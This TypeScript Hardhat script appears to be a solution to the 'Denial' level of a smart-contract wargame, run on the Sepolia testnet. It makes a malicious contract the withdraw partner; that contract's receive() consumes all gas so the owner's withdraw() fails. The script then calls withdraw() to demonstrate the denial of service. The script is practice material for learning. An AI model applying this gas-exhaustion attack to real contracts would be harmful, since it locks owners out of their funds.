import { ethers } from "hardhat";

/**
 * Execute the Denial exploit to prevent the owner from withdrawing funds
 * 
 * Usage:
 * DENIAL_EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xYourDenialAddress npx hardhat run scripts/level-20-denial/execute-denial-exploit.ts --network sepolia
 */
async function main() {
  console.log("Executing Denial exploit...");
  
  // Get the addresses from environment
  const exploitAddress = process.env.DENIAL_EXPLOIT_ADDRESS;
  const targetAddress = process.env.TARGET_ADDRESS;
  
  if (!exploitAddress) {
    throw new Error("Environment variable DENIAL_EXPLOIT_ADDRESS must be set");
  }
  
  if (!targetAddress) {
    throw new Error("Environment variable TARGET_ADDRESS must be set");
  }
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}`);
  
  try {
    // Connect to the contracts
    const denialExploit = await ethers.getContractAt("DenialExploit", exploitAddress);
    const denial = await ethers.getContractAt("Denial", targetAddress);
    
    // Check current partner
    const currentPartner = await denial.partner();
    console.log(`Current withdraw partner: ${currentPartner}`);
    
    // Check contract balance
    const balance = await denial.contractBalance();
    console.log(`Denial contract balance: ${ethers.formatEther(balance)} ETH`);
    
    if (balance === 0n) {
      console.log("\n⚠️  Warning: Denial contract has no balance. The exploit will work, but you may want to fund it first.");
    }
    
    // Execute the exploit - set our malicious contract as the withdraw partner
    console.log(`\nSetting DenialExploit contract as withdraw partner...`);
    const tx = await denialExploit.exploit();
    console.log("Transaction hash:", tx.hash);
    
    const receipt = await tx.wait();
    console.log("Transaction confirmed in block:", receipt?.blockNumber || 'unknown');
    
    // Verify that our contract is now the partner
    const newPartner = await denial.partner();
    console.log(`\nNew withdraw partner: ${newPartner}`);
    
    if (newPartner.toLowerCase() === exploitAddress.toLowerCase()) {
      console.log("\n✅ Success! DenialExploit is now the withdraw partner.");
      console.log("\n📋 What happens next:");
      console.log("   - When the owner calls withdraw(), the contract will send 1% to our malicious partner");
      console.log("   - Our partner's receive() function will consume all gas with an infinite loop");
      console.log("   - The subsequent transfer to the owner will fail due to out of gas");
      console.log("   - The owner is denied from withdrawing their funds!");
      
      console.log("\n🧪 Testing the denial:");
      console.log("   Try calling withdraw() on the Denial contract:");
      console.log(`   - The transaction should fail with 'out of gas' error`);
      console.log(`   - The owner won't receive their share of funds`);
      
      // Attempt to demonstrate the denial (this will likely fail)
      console.log("\n🔬 Attempting to call withdraw() to demonstrate the DoS attack...");
      console.log("   (This will likely revert with out of gas error)");
      
      try {
        // Try to call withdraw with a gas limit to show it fails
        const withdrawTx = await denial.withdraw({ gasLimit: 1000000 });
        await withdrawTx.wait();
        console.log("❌ Unexpected: withdraw() succeeded. The attack may not have worked as expected.");
      } catch (error: any) {
        if (error.message.includes("out of gas") || error.message.includes("gas")) {
          console.log("✅ Perfect! withdraw() failed due to out of gas, demonstrating successful DoS attack!");
        } else {
          console.log(`⚠️  withdraw() failed with error: ${error.message}`);
        }
      }
    } else {
      console.log("\n❌ Failed! The withdraw partner was not set to our exploit contract.");
    }
  } catch (error) {
    console.error("Error executing Denial exploit:", error);
    throw error;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
